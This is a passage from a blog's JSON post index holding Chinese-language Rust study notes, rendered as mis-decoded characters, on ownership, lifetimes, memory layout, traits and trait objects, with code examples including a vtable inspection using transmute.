linfa","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Rust","slug":"Notes/Rust","permalink":"https://racleray.github.io/categories/Notes/Rust/"}],"tags":[{"name":"Rust","slug":"Rust","permalink":"https://racleray.github.io/tags/Rust/"}]},{"title":"RUST Part1","slug":"RUST-part1","date":"2024-06-27T14:54:55.000Z","updated":"2024-06-27T14:59:34.346Z","comments":true,"path":"posts/9b4059d6.html","link":"","permalink":"https://racleray.github.io/posts/9b4059d6.html","excerpt":"Rust Notes","text":"RUST æ¦‚è§ˆ Rust å˜é‡å’Œå‡½æ•° const , static å˜é‡éœ€è¦å£°æ˜ç±»å‹ã€‚const æ˜¯å³å€¼ï¼Œä¿å­˜åœ¨å¯æ‰§è¡Œæ–‡ä»¶çš„æ•°æ®æ®µã€‚static å¯ä»¥å£°æ˜ä¸ºå¯å˜ï¼Œlazy_static ç»“åˆä½¿ç”¨ã€‚ é»˜è®¤å˜é‡ä¸å¯å˜ å‡½æ•°å¯ä»¥ä½œä¸ºå‚æ•°æˆ–è€…è¿”å›å€¼ã€‚å‡½æ•°æ²¡è¿”å›å€¼æ—¶ï¼Œé»˜è®¤è¿”å› unit ()ã€‚ Rust æ•°æ®ç»“æ„ struct å®šä¹‰ç»“æ„ä½“ï¼Œstruct () å…ƒç»„ç»“æ„ä½“ï¼Œæœ‰åŒ¿ååŸŸã€‚ç©ºç»“æ„ä½“ä¸å ä»»ä½•ç©ºé—´ã€‚ enum å®šä¹‰ tagged union tuple () æ•°æ®è¡Œä¸ºé€šè¿‡ trait å®šä¹‰ æ´¾ç”Ÿå®æ”¯æŒï¼Œ#[derive(Debug)] ï¼Œæ”¯æŒ {:?} è¿›è¡Œæ‰“å° Copy å‚æ•°ä¼ é€’æ—¶ï¼ŒæŒ‰å­—èŠ‚æ‹·è´ Clone æ”¯æŒç»“æ„å¤åˆ¶ Rust æ§åˆ¶æµç¨‹ é¡ºåºæ‰§è¡Œï¼Œå‡½æ•°è·³è½¬ä¸Šä¸‹æ–‡æ‰§è¡Œ å¾ªç¯æ‰§è¡Œï¼Œloop æ­»å¾ªç¯ï¼Œwhile æ¡ä»¶å¾ªç¯ï¼Œè¿­ä»£å¾ªç¯ forã€‚for å¾ªç¯å¯ç”¨äºä»»ä½•å®ç°äº† IntoIterator trait çš„æ•°æ®ç»“æ„ï¼Œå®é™…ä¸Šæ˜¯ loop è®¿é—®è¿­ä»£å™¨ï¼Œç›´åˆ°è¿”å› None åˆ†æ”¯æ‰§è¡Œï¼Œif/else æ¨¡å¼åŒ¹é…åˆ†æ”¯æ‰§è¡Œã€‚match expr {} ï¼Œif let pat = expr {} åªå…³å¿ƒæŸä¸€ç§åŒ¹é…æƒ…å†µ é”™è¯¯è·³è½¬ï¼Œç»ˆæ­¢å½“å‰å‡½æ•°æ‰§è¡Œï¼Œå‘ä¸Šä¸€å±‚è¿”å›é”™è¯¯ å¼‚æ­¥è·³è½¬ï¼Œasync å‡½æ•°æ‰§è¡Œ await ï¼Œç¨‹åºå¯èƒ½é˜»å¡å½“å‰ä¸Šä¸‹æ–‡ï¼Œè·³è½¬åˆ°å¦ä¸€ä¸ªå¼‚æ­¥ä»»åŠ¡ï¼Œç›´åˆ° await ä¸å†é˜»å¡ï¼ˆpoll()ï¼‰ Rust é”™è¯¯å¤„ç† å€Ÿé‰´ Haskell çš„é”™è¯¯å¤„ç†ï¼Œé”™è¯¯å°è£…åœ¨ Result&lt;T, E&gt; ç±»å‹ä¸­ã€‚? ç”¨äºä¼ æ’­é”™è¯¯ã€‚ Rust é¡¹ç›®ç»„ç»‡ mod ç»„ç»‡ã€‚åœ¨ lib.rs æˆ–è€… main.rs ä¸­ï¼Œç”¨ mod æ¥å£°æ˜è¦åŠ è½½çš„æ¨¡å—ã€‚å­æ–‡ä»¶ä¸‹ä¸‹ï¼Œæ–°å»º mod.rs ç±»ä¼¼ python ä¸­çš„ __init__.py ï¼Œå†™å…¥ç›®å½•ä¸‹çš„å­æ¨¡å—æ–‡ä»¶åç§° xx.rs ä¸€ä¸ªé¡¹ç›®ä¹Ÿè¢«ç§°ä¸º crateï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªåº“ã€‚ å•å…ƒæµ‹è¯•ä¸€èˆ¬æ”¾åœ¨è¢«æµ‹è¯•ä»£ç ç›¸åŒçš„æ–‡ä»¶ä¸­ï¼Œä½¿ç”¨æ¡ä»¶ç¼–è¯‘ #[cfg(test)] æ¥ç¡®ä¿æµ‹è¯•ä»£ç æ—¨åœ¨æµ‹è¯•ç¯å¢ƒä¸­ç¼–è¯‘ã€‚ é›†æˆæµ‹è¯•ä¸€èˆ¬æ”¾åœ¨ tests ç›®å½•ä¸‹ï¼Œé›†æˆæµ‹è¯•åªæµ‹è¯•å…¬å¼€æ¥å£ï¼Œç¼–è¯‘æ—¶ç¼–è¯‘æˆå•ç‹¬çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ cargo test è¿è¡Œæµ‹è¯•ç”¨ä¾‹ æ‰€æœ‰ä»£ç æ”¾åœ¨ä¸€ä¸ª crate ä¸­ï¼Œä¼šå¯¼è‡´ä¿®æ”¹åï¼Œé¢‘ç¹ç¼–è¯‘æ•´ä¸ª crateã€‚workspace æ˜¯ç®¡ç†å¤šä¸ª crate çš„å·¥å…·ã€‚ä¿®æ”¹åªå½±å“æ‰€åœ¨çš„ crateã€‚ Rust å¯ä»¥ç”¨è¿‡ç¨‹å®ã€traitã€æ³›å‹å‡½æ•°ã€trait object ç­‰ç»„ç»‡ä»£ç ã€‚ Rust æœåŠ¡å™¨å‚è€ƒï¼šactix-web ã€rocket ã€warpã€ axum æ‰€æœ‰æƒå’Œç”Ÿå‘½å‘¨æœŸ ä¸€ä¸ªå€¼åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªæ‰€æœ‰è€…ï¼Œä½œç”¨åŸŸå¤–é‡Šæ”¾èµ„æº èµ‹å€¼æˆ–è€…ä¼ å‚ Move è¯­ä¹‰è½¬ç§»æ‰€æœ‰æƒ Copy trait ä¿ç•™åŸæ‰€æœ‰æƒï¼ŒæŒ‰ä½æ‹·è´æ•°æ®ï¼Œæµ…æ‹·è´ã€‚å¯å˜å¼•ç”¨ã€åŠ¨æ€å¤§å°æ•°æ®ç»“æ„ã€åŒ…å«åŠ¨æ€å¤§å°æˆå‘˜çš„ç»“æ„æ²¡æœ‰é»˜è®¤å®ç° Copy trait Borrow é»˜è®¤æ˜¯åªè¯»çš„ï¼Œä¸å½±å“æ‰€æœ‰æƒ Rust ä¼ å‚éƒ½æ˜¯ä¼ å€¼ ä¸€ä¸ªå€¼å¯ä»¥æœ‰å¤šä¸ªåªè¯»å¼•ç”¨ï¼Œä½†æ˜¯ï¼Œåªè¯»å¼•ç”¨ä¸å¯ä»¥å’Œå¯å˜å¼•ç”¨å…±å­˜ï¼ŒåŠ¨æ€å†…å­˜å†åˆ†é…å¯¼è‡´åœ°å€å¤±æ•ˆçš„é—®é¢˜ ä¸€ä¸ªå€¼åªèƒ½æœ‰ä¸€ä¸ªå¯å˜å¼•ç”¨ åœ¨æ‰€æœ‰æƒæ¨¡å‹ä¸‹ï¼Œå †å†…å­˜çš„ç”Ÿå‘½å‘¨æœŸï¼Œå’Œåˆ›å»ºå®ƒçš„æ ˆå†…å­˜çš„ç”Ÿå‘½å‘¨æœŸä¿æŒä¸€è‡´ å¼•ç”¨çš„ç”Ÿå‘½å‘¨æœŸä¸èƒ½è¶…è¿‡å€¼çš„ç”Ÿå‘½å‘¨æœŸ è¿è¡Œæ—¶åŠ¨æ€æ£€æŸ¥ï¼Œæä¾›æ‰€æœ‰æƒçš„çµæ´»æ§åˆ¶ Rc å’Œ Arc ï¼Œåˆ›å»ºå¤šä¸ªæ‰€æœ‰è€…çš„æ•°æ®ç»“æ„ï¼Œclone() ä¸ä¼šå¤åˆ¶å†…å­˜ä¸­æ•°æ®ï¼Œåªä¼šå¢åŠ å¼•ç”¨è®¡æ•°ï¼ŒRc å’Œ Arc æ˜¯å¯å˜çš„ï¼Œéœ€è¦ç»“åˆ RefCell å’Œ Mutex å®ç°æ•°æ®çš„å¯å˜ä¿®æ”¹ Weak æ˜¯ Rc çš„å¼±å¼•ç”¨ç‰ˆæœ¬ RefCell ç»•è¿‡ Rust ç¼–è¯‘å™¨é™æ€æ£€æŸ¥ï¼Œå…è®¸åœ¨è¿è¡Œæ—¶å¯¹åªè¯»æ•°æ®è¿›è¡Œå¯å˜å€Ÿç”¨ã€‚Rc æœ¬èº«æ˜¯ä¸€ä¸ªåªè¯»çš„å¼•ç”¨è®¡æ•°å™¨ Arc è·¨çº¿ç¨‹è®¿é—®ï¼ŒåŸå­å¼•ç”¨è®¡æ•°ï¼ŒRefCell å˜ä¸º Mutex(v.lock()) æˆ–è€… RwLock (v.read()/v.write()) Box::leak() åˆ›å»ºäº†ä¸å—æ ˆå†…å­˜æ§åˆ¶çš„å †å†…å­˜ï¼Œä»è€Œç»•è¿‡äº†ç¼–è¯‘æ—¶æ‰€æœ‰æƒè§„åˆ™æ£€æŸ¥ å¤–éƒ¨å¯å˜æ€§ï¼Œlet mut , let &amp;mutï¼Œç¼–è¯‘æ—¶æ£€æŸ¥ è¿è¡Œæ—¶ï¼Œä¿®æ”¹å†…éƒ¨æ•°æ®ï¼ŒRefCell borrow_mut()ï¼Œå‡ºé”™ä¼šå¼•å‘ panic ç”Ÿå‘½å‘¨æœŸ é™¤äº†æ˜¾ç¤ºåœ°åš Box::leak() / Box::into_raw() / ManualDrop ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå †å†…å­˜çš„ç”Ÿå‘½å‘¨æœŸä¼šå’Œå…¶æ ˆå†…å­˜çš„ç”Ÿå‘½å‘¨æœŸç»‘å®šåœ¨ä¸€èµ· é™æ€ç”Ÿå‘½å‘¨æœŸçš„å€¼ï¼Œå…¶å¼•ç”¨ä¹Ÿæœ‰é™æ€ç”Ÿå‘½å‘¨æœŸ å…¨å±€å˜é‡ï¼Œé™æ€å˜é‡ï¼Œå­—ç¬¦ä¸²å­—é¢é‡ç­‰ï¼Œéƒ½æœ‰é™æ€ç”Ÿå‘½å‘¨æœŸï¼ŒBox::leak åä¹Ÿå…·æœ‰é™æ€ç”Ÿå‘½å‘¨æœŸï¼Œå‡½æ•°æŒ‡é’ˆå˜é‡ä¹Ÿæ˜¯é™æ€ç”Ÿå‘½å‘¨æœŸï¼ˆå› ä¸ºå®ƒåœ¨ text æ®µï¼‰ æŸä¸ªä½œç”¨åŸŸä¸­ï¼Œåˆ›å»ºåœ¨å †å’Œæ ˆä¸Šçš„å€¼ï¼Œå…¶ç”Ÿå‘½å‘¨æœŸæ˜¯åŠ¨æ€çš„ åŠ¨æ€ç”Ÿå‘½å‘¨æœŸçš„è¡¨è¾¾ï¼Œçº¦å®šä½¿ç”¨ 'a 'b è¿™æ ·è¡¨è¿° ç”Ÿå‘½å‘¨æœŸæè¿°çš„æ˜¯å‚æ•°ä¸å‚æ•°ä¹‹é—´ï¼Œå‚æ•°ä¸è¿”å›å€¼ä¹‹é—´çš„å…³ç³»ï¼Œå¹¶ä¸æ”¹å˜åŸæœ‰çš„ç”Ÿå‘½å‘¨æœŸ æ‰€æœ‰å¼•ç”¨ç±»å‹çš„å‚æ•°éƒ½éœ€è¦ç”Ÿå‘½å‘¨æœŸæ ‡æ³¨ ç¼–è¯‘å™¨å¯ä»¥ä¾ç…§ä¸€äº›å‡†åˆ™ï¼Œè‡ªåŠ¨æ·»åŠ æ ‡æ³¨ï¼š æ‰€æœ‰å¼•ç”¨ç±»å‹çš„å‚æ•°éƒ½æœ‰ç‹¬ç«‹çš„ç”Ÿå‘½å‘¨æœŸ å¦‚æœåªæœ‰ä¸€ä¸ªå¼•ç”¨ç±»å‹è¾“å…¥ï¼Œå®ƒçš„ç”Ÿå‘½å‘¨æœŸä¼šèµ‹ç»™æ‰€æœ‰çš„è¾“å‡º å¦‚æœæœ‰å¤šä¸ªå¼•ç”¨ç±»å‹çš„å‚æ•°ï¼Œå…¶ä¸­ä¸€ä¸ªæ˜¯ selfï¼Œé‚£ä¹ˆå®ƒçš„ç”Ÿå‘½å‘¨æœŸä¼šèµ‹ç»™æ‰€æœ‰è¾“å‡º ä½¿ç”¨æ•°æ®ç»“æ„æ—¶ï¼Œæ•°æ®ç»“æ„è‡ªèº«çš„ç”Ÿå‘½å‘¨æœŸï¼Œéœ€è¦å°äºç­‰äºå…¶å†…éƒ¨å­—æ®µçš„æ‰€æœ‰å¼•ç”¨çš„ç”Ÿå‘½å‘¨æœŸ å†…å­˜ç®¡ç† struct åœ¨æ ˆç©ºé—´ä¸­ï¼Œrust ä¼šè‡ªåŠ¨é‡æ’ç»“æ„ä½“ enum æŒ‰ç…§æœ€å¤§ç±»å‹é•¿åº¦å¯¹é½ï¼Œé•¿åº¦ä¹˜ä»¥æˆå‘˜æ•°é‡ Option ä¼šè¢«æœ‰å€¼å’Œæ— å€¼åˆ†åˆ«å ç”¨ä¸¤å—å†…å­˜ä½ç½® Result&lt;T, E&gt; ä¼šå ç”¨ä¸¤å—ä½ç½® T å’Œ E rust ä¼šå¯¹ Option è¿™ç§å¼•ç”¨ç±»å‹æ•°æ®è¿›è¡Œä¼˜åŒ–ï¼Œåªå ç”¨ä¸€å—ç©ºé—´ï¼Œå› ä¸º ptr å¼•ç”¨ä¸º 0 æ˜¯ä¸å¯èƒ½çš„ï¼ˆä¸€å®šé”™è¯¯çš„ï¼‰ï¼Œé‚£ä¹ˆå°±å°† 0 è¡¨ç¤º None String å†…éƒ¨æ˜¯ Vecï¼ŒVec æ˜¯ 3 ä¸ª word å¤§å°çš„èƒ–æŒ‡é’ˆï¼špointerï¼Œcapacityï¼Œlength Ref : Rust Language Cheat Sheet Copy Move éƒ½åªæ˜¯æµ…å±‚çš„æŒ‰ä½å†…å­˜å¤åˆ¶ï¼Œåªè¦ä¸æ¶‰åŠæ ˆä¸Šçš„å¤§æ•°ç»„æ‹·è´æˆ–è€…å †å†…å­˜çš„æ·±æ‹·è´ï¼Œæ•ˆç‡è¿˜æ˜¯å¾ˆé«˜çš„ åŠ¨æ€æ•°æ®ç»“æ„ï¼Œéœ€è¦æ³¨æ„é¢‘ç¹çš„åŠ¨æ€æ‰©å®¹ç¼©å®¹ï¼Œå¯¼è‡´çš„æ•°æ®æ‹·è´ï¼Œé€ æˆçš„æ•ˆç‡ä¸‹é™ã€‚åŒæ—¶è€ƒè™‘ä½¿ç”¨ shrink_to_fit èŠ‚çœå†…å­˜ä½¿ç”¨ Drop trait ï¼Œç›¸å½“äºææ„å‡½æ•°ï¼Œé€’å½’è°ƒç”¨æˆå‘˜çš„ drop() rust ä¼šè‡ªåŠ¨å¯¹ socketï¼Œfileï¼Œlock è¿›è¡Œå…³é—­ï¼Œè¿™æ˜¯å…¶ä»–è¯­è¨€ä¸­å¾ˆç½•è§çš„ å¤šä¸ªå˜é‡å’Œå¤šç§å¼‚å¸¸æˆ–è€…é”™è¯¯å åŠ ï¼Œå¿˜è®°é‡Šæ”¾èµ„æºçš„é£é™©æ•å£ä¼šæˆå€å¢åŠ ï¼Œå¯¼è‡´æ­»é”æˆ–è€…èµ„æºæ³„éœ²ã€‚ ç±»å‹ç³»ç»Ÿ å¯¹ç±»å‹è¿›è¡Œå®šä¹‰ï¼Œæ£€æŸ¥ï¼Œå¤„ç†çš„ç³»ç»Ÿã€‚ æŒ‰ç…§å®šä¹‰åï¼Œç±»å‹æ˜¯å¦å¯ä»¥éšå¼è½¬åŒ–ï¼Œåˆ†ä¸ºå¼ºç±»å‹å’Œå¼±ç±»å‹ æŒ‰ç…§ç±»å‹æ£€æŸ¥çš„æ—¶æœºæ˜¯ç¼–è¯‘æ—¶æ£€æŸ¥è¿˜æ˜¯è¿è¡Œæ—¶æ£€æŸ¥ï¼Œåˆ†ä¸ºé™æ€ç±»å‹ç³»ç»Ÿå’ŒåŠ¨æ€ç±»å‹ç³»ç»Ÿ Rust æ˜¯å¼ºç±»å‹åŠ é™æ€ç±»å‹ç³»ç»Ÿã€‚åªèƒ½æŒ‰ç…§è¢«å…è®¸çš„æ–¹æ³•ï¼Œè®¿é—®å®ƒè¢«æˆæƒè®¿é—®çš„å†…å­˜ã€‚ Rust ä¸­é™¤äº† let / fn / static / const è¿™äº›å®šä¹‰æ€§è¯­å¥å¤–ï¼Œéƒ½æ˜¯è¡¨è¾¾å¼ï¼Œè€Œä¸€åˆ‡è¡¨è¾¾å¼éƒ½æœ‰ç±»å‹ï¼Œæ‰€ä»¥å¯ä»¥è¯´åœ¨ Rust ä¸­ï¼Œç±»å‹æ— å¤„ä¸åœ¨ã€‚ å¤šæ€çš„å®ç°ï¼š åŠ¨æ€ç±»å‹ç³»ç»Ÿï¼Œé€šè¿‡é¸­å­ç±»å‹å®ç° é™æ€ç±»å‹ç³»ç»Ÿï¼Œé€šè¿‡å‚æ•°å¤šæ€ï¼Œç‰¹è®¾å¤šæ€ï¼Œå­ç±»å‹å¤šæ€å®ç° å‚æ•°å¤šæ€ï¼šä»£ç æ“ä½œçš„ç±»å‹æ˜¯ï¼Œä¸€ä¸ªæ»¡è¶³ä¸€äº›çº¦æŸæ¡ä»¶çš„å‚æ•°ï¼Œè€Œéå…·ä½“çš„ç±»å‹ ç‰¹è®¾å¤šæ€ï¼šä¸€ç§è¡Œä¸ºå¯ä»¥æœ‰å¤šä¸ªä¸åŒå®ç°çš„å¤šæ€ï¼Œæ¯”å¦‚å‡½æ•°é‡è½½ å­ç±»å‹å¤šæ€ï¼šåœ¨è¿è¡Œæ—¶ï¼Œå­ç±»å‹å¯ä»¥è¢«å½“æˆçˆ¶ç±»å‹ä½¿ç”¨ Rust æ”¯æŒï¼š å‚æ•°å¤šæ€ -- é€šè¿‡æ³›å‹å®ç° ç‰¹è®¾å¤šæ€ -- é€šè¿‡ trait æ¥æ”¯æŒ å­ç±»å‹å¤šæ€ -- é€šè¿‡ trait object æ¥æ”¯æŒ Rust æ”¯æŒä¸€ä¸ªä½œç”¨åŸŸå†…çš„å±€éƒ¨ç±»å‹æ¨å¯¼ã€‚ä½†æ˜¯ï¼Œåœ¨ä¸èƒ½æ¨æ–­å‡ºç±»å‹çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œéœ€è¦æ‰‹åŠ¨æŒ‡æ˜ç±»å‹ã€‚æ¯”å¦‚ï¼Œå…¨å±€å˜é‡ const / staticã€‚ Models of Generics and Metaprogramming: Go, Rust, Swift, D and More - Tristan Hume (thume.ca) Trait Rust ä¸­çš„æ¥å£ï¼Œå®šä¹‰äº†æŸä¸ªç±»å‹ä½¿ç”¨è¿™ä¸ªæ¥å£çš„è¡Œä¸ºã€‚å°†æ•°æ®ç»“æ„çš„è¡Œä¸ºå•ç‹¬æŠ½å–å‡ºæ¥ï¼Œå¯ä»¥åœ¨å¤šä¸ªç±»å‹ä¸­å…±äº«ï¼Œæˆ–è€…ä½œä¸ºå‚æ•°çº¦æŸï¼Œåœ¨æ³›å‹ç¼–ç¨‹ä¸­ä½¿ç”¨ã€‚ å¸¦çº¦æŸçš„ Trait 12345678910111213141516171819202122232425use std::str::FromStr;use regex::Regex;pub trait Parse &#123; fn parse(s: &amp;str) -&gt; Self;&#125;// çº¦æŸ T å¿…é¡»åŒæ—¶å®ç°äº† FromStr å’Œ Defaultimpl&lt;T&gt; Parse for Twhere T: FromStr + Default,&#123; fn parse(s: &amp;str) -&gt; Self &#123; let re: Regex = Regex::new(r\"^[0-9]+(\\.[0-9]+)?\").unwrap(); // Default::default() è¿”å›çš„ç±»å‹æ ¹æ®ä¸Šä¸‹æ–‡èƒ½æ¨å¯¼å‡ºæ¥ let d = || Default::default(); if let Some(captures) = re.captures(s) &#123; captures .get(0) .map_or(d(), |s| s.as_str().parse().unwrap_or(d())) &#125; else &#123; d() &#125; &#125;&#125; å¸¦å…³è”ç±»å‹çš„ Trait 12345678910111213141516171819202122232425262728293031use std::str::FromStr;use regex::Regex;pub trait Parse &#123; type Error; fn parse(s: &amp;str) -&gt; Result&lt;Self, Self::Error&gt; where Self: Sized;&#125;impl&lt;T&gt; Parse for Twhere T: FromStr + Default,&#123; // å®šä¹‰å…³è”ç±»å‹ Error ä¸º String type Error = String; fn parse(s: &amp;str) -&gt; Result&lt;Self, Self::Error&gt; &#123; let re: Regex = Regex::new(r\"^[0-9]+(\\.[0-9]+)?\").unwrap(); if let Some(captures) = re.captures(s) &#123; captures .get(0) .map_or(Err(\"failed to capture\".to_string()), |s| &#123; s.as_str() .parse() .map_err(|_err| \"failed to parse captured string\".to_string()) &#125;) &#125; else &#123; Err(\"failed to parse string\".to_string()) &#125; &#125;&#125; trait æ–¹æ³•é‡Œçš„å‚æ•°æˆ–è€…è¿”å›å€¼ï¼Œéƒ½å¯ä»¥ç”¨å…³è”ç±»å‹æ¥è¡¨è¿°ï¼Œè€Œåœ¨å®ç°æœ‰å…³è”ç±»å‹çš„ trait æ—¶ï¼Œåªéœ€è¦é¢å¤–æä¾›å…³è”ç±»å‹çš„å…·ä½“ç±»å‹å³å¯ã€‚ æ”¯æŒæ³›å‹çš„ Trait 12345pub trait Add&lt;Rhs = Self&gt; &#123; type Output; #[must_use] fn add(self, rhs: Rhs) -&gt; Self::Output;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142// å¯¹ Complex ç±»å‹çš„å®ç°impl Add for Complex &#123; type Output = Self; // æ³¨æ„ add ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ selfï¼Œä¼šç§»åŠ¨æ‰€æœ‰æƒ fn add(self, rhs: Self) -&gt; Self::Output &#123; let real = self.real + rhs.real; let imagine = self.imagine + rhs.imagine; Self::new(real, imagine) &#125;&#125;// ä¸º &amp;Complex å®ç° addimpl Add for &amp;Complex &#123; // è¿”å› Complex type Output = Complex; fn add(self, rhs: Self) -&gt; Self::Output &#123; let real = self.real + rhs.real; let imagine = self.imagine + rhs.imagine; Complex::new(real, imagine) &#125;&#125;// å› ä¸º Add&lt;Rhs = Self&gt; æ˜¯ä¸ªæ³›å‹ traitï¼Œå¯ä»¥ä¸º Complex å®ç° Add&lt;f64&gt;impl Add&lt;f64&gt; for &amp;Complex &#123; type Output = Complex; // rhs ç°åœ¨æ˜¯ f64 fn add(self, rhs: f64) -&gt; Self::Output &#123; let real = self.real + rhs; Complex::new(real, self.imagine) &#125;&#125;fn main() &#123; let c1 = Complex::new(1.0, 1f64); let c2 = Complex::new(2 as f64, 3.0); println!(\"&#123;:?&#125;\", &amp;c1 + &amp;c2); println!(\"&#123;:?&#125;\", &amp;c1 + 5.0); println!(\"&#123;:?&#125;\", c1 + c2);&#125; æ³›å‹ trait å¯ä»¥åœ¨éœ€è¦çš„æ—¶å€™ï¼Œå¯¹åŒä¸€ç§ç±»å‹çš„åŒä¸€ä¸ª traitï¼Œæœ‰å¤šä¸ªå®ç°ã€‚ Trait çš„ç»§æ‰¿ trait B: Aï¼Œè¡¨ç¤º trait B åœ¨å®šä¹‰æ—¶å¯ä»¥ä½¿ç”¨ trait A ä¸­çš„å…³è”ç±»å‹å’Œæ–¹æ³•ã€‚ å¾ˆå¤šå¸¸è§çš„ trait éƒ½ä¼šä½¿ç”¨ trait ç»§æ‰¿æ¥æä¾›æ›´å¤šçš„èƒ½åŠ›ï¼Œæ¯”å¦‚ tokio åº“ä¸­çš„ AsyncWriteExtã€futures åº“ä¸­çš„ StreamExtã€‚ 1impl&lt;T: ?Sized&gt; StreamExt for T where T: Stream &#123;&#125; åŸºäºå­ç±»å‹å¤šæ€ Rust è™½ç„¶æ²¡æœ‰çˆ¶ç±»å’Œå­ç±»ï¼Œä½† trait å’Œå®ç° trait çš„ç±»å‹ä¹‹é—´ä¹Ÿæ˜¯ç±»ä¼¼çš„å…³ç³»ã€‚ 12345678910111213141516171819202122232425262728struct Cat;struct Dog;trait Animal &#123; fn name(&amp;self) -&gt; &amp;'static str;&#125;impl Animal for Cat &#123; fn name(&amp;self) -&gt; &amp;'static str &#123; \"Cat\" &#125;&#125;impl Animal for Dog &#123; fn name(&amp;self) -&gt; &amp;'static str &#123; \"Dog\" &#125;&#125;// ç­‰ä»·äº fn name&lt;T: Animal&gt;(animal: T) -&gt; &amp;'static str;fn name(animal: impl Animal) -&gt; &amp;'static str &#123; animal.name()&#125;fn main() &#123; let cat = Cat; println!(\"cat: &#123;&#125;\", name(cat));&#125; è¿™ç§æ³›å‹å‡½æ•°ä¼šæ ¹æ®å…·ä½“ä½¿ç”¨çš„ç±»å‹è¢«å•æ€åŒ–ï¼Œç¼–è¯‘æˆå¤šä¸ªå®ä¾‹ï¼Œæ˜¯é™æ€åˆ†æ´¾ã€‚ ä½†æ˜¯æœ‰çš„æ—¶å€™ï¼Œç±»å‹å¯èƒ½å¾ˆéš¾åœ¨ç¼–è¯‘æ—¶å†³å®šã€‚ä½¿ç”¨ Trait Object å¯ä»¥åº”å¯¹è¿™ç§æƒ…å†µã€‚ 1234567891011121314151617181920// Vec&lt;&gt; å®¹å™¨é‡Œçš„ç±»å‹éœ€è¦æ˜¯ä¸€è‡´çš„ï¼Œä½†æ­¤å¤„æ— æ³•ç»™å®šä¸€ä¸ªä¸€è‡´çš„ç±»å‹ã€‚pub fn format(input: &amp;mut String, formatters: Vec&lt;???&gt;) &#123; for formatter in formatters &#123; formatter.format(input); &#125;&#125;// åŠ¨æ€åˆ†æ´¾ï¼ˆdynamic dispatchingï¼‰pub fn format(input: &amp;mut String, formatters: Vec&lt;&amp;dyn Formatter&gt;) &#123; for formatter in formatters &#123; formatter.format(input); &#125;&#125;fn main() &#123; let html: &amp;dyn Formatter = &amp;HtmlFormatter; let rust: &amp;dyn Formatter = &amp;RustFormatter; let formatters = vec![html, rust]; ...&#125; HtmlFormatter çš„å¼•ç”¨èµ‹å€¼ç»™ Formatter åï¼Œä¼šç”Ÿæˆä¸€ä¸ª Trait Objectã€‚ Trait Object çš„åº•å±‚é€»è¾‘å°±æ˜¯èƒ–æŒ‡é’ˆã€‚å…¶ä¸­ï¼Œä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘æ•°æ®æœ¬èº«ï¼Œå¦ä¸€ä¸ªåˆ™æŒ‡å‘è™šå‡½æ•°è¡¨ï¼ˆvtableï¼‰ã€‚ vtable æ˜¯ä¸€å¼ é™æ€çš„è¡¨ï¼ŒRust åœ¨ç¼–è¯‘æ—¶ä¼šä¸ºä½¿ç”¨äº† trait object çš„ç±»å‹çš„ trait å®ç°ç”Ÿæˆä¸€å¼ è¡¨ï¼Œæ”¾åœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼ˆä¸€èˆ¬åœ¨ TEXT æˆ– RODATA æ®µï¼‰ã€‚ Rust ä¹Ÿå¹¶ä¸åŒºåˆ†åŸç”Ÿç±»å‹å’Œç»„åˆç±»å‹ï¼Œå¯¹ Rust æ¥è¯´ï¼Œæ‰€æœ‰ç±»å‹çš„åœ°ä½éƒ½æ˜¯ä¸€è‡´çš„ã€‚ ä½¿ç”¨ trait object çš„æ—¶å€™ï¼Œè¦æ³¨æ„å¯¹è±¡å®‰å…¨ï¼ˆobject safetyï¼‰ã€‚åªæœ‰æ»¡è¶³å¯¹è±¡å®‰å…¨çš„ trait æ‰èƒ½ä½¿ç”¨ trait objectã€‚å¦‚æœ trait æ‰€æœ‰çš„æ–¹æ³•ï¼Œè¿”å›å€¼æ˜¯ Self æˆ–è€…æºå¸¦æ³›å‹å‚æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ª trait å°±ä¸èƒ½äº§ç”Ÿ trait objectã€‚å¦‚æœä¸€ä¸ª trait åªæœ‰éƒ¨åˆ†æ–¹æ³•è¿”å› Self æˆ–è€…ä½¿ç”¨äº†æ³›å‹å‚æ•°ï¼Œé‚£ä¹ˆè¿™éƒ¨åˆ†æ–¹æ³•åœ¨ trait object ä¸­ä¸èƒ½è°ƒç”¨ã€‚ ä¸å…è®¸è¿”å› Selfï¼Œæ˜¯å› ä¸º trait object åœ¨äº§ç”Ÿæ—¶ï¼ŒåŸæ¥çš„ç±»å‹ä¼šè¢«æŠ¹å»ï¼Œæ‰€ä»¥ Self ç©¶ç«Ÿæ˜¯è°ä¸çŸ¥é“ã€‚æ¯”å¦‚ Clone trait åªæœ‰ä¸€ä¸ªæ–¹æ³• clone()ï¼Œè¿”å› Selfï¼Œæ‰€ä»¥å®ƒå°±ä¸èƒ½äº§ç”Ÿ trait objectã€‚ ä¸å…è®¸æºå¸¦æ³›å‹å‚æ•°ï¼Œæ˜¯å› ä¸º Rust é‡Œå¸¦æ³›å‹çš„ç±»å‹åœ¨ç¼–è¯‘æ—¶ä¼šåšå•æ€åŒ–ï¼Œè€Œ trait object æ˜¯è¿è¡Œæ—¶çš„äº§ç‰©ï¼Œä¸¤è€…ä¸èƒ½å…¼å®¹ã€‚ vtable æµ‹è¯• 12345678910111213141516171819202122232425262728293031323334353637383940414243444546use std::fmt::&#123;Debug, Display&#125;;use std::mem::transmute;fn main() &#123; let s1 = String::from(\"hello world!\"); let s2 = String::from(\"goodbye world!\"); // Display / Debug trait object for s let w1: &amp;dyn Display = &amp;s1; let w2: &amp;dyn Debug = &amp;s1; // Display / Debug trait object for s1 let w3: &amp;dyn Display = &amp;s2; let w4: &amp;dyn Debug = &amp;s2; // å¼ºè¡ŒæŠŠ triat object è½¬æ¢æˆä¸¤ä¸ªåœ°å€ (usize, usize) // è¿™æ˜¯ä¸å®‰å…¨çš„ï¼Œæ‰€ä»¥æ˜¯ unsafe let (addr1, vtable1): (usize, usize) = unsafe &#123; transmute(w1) &#125;; let (addr2, vtable2): (usize, usize) = unsafe &#123; transmute(w2) &#125;; let 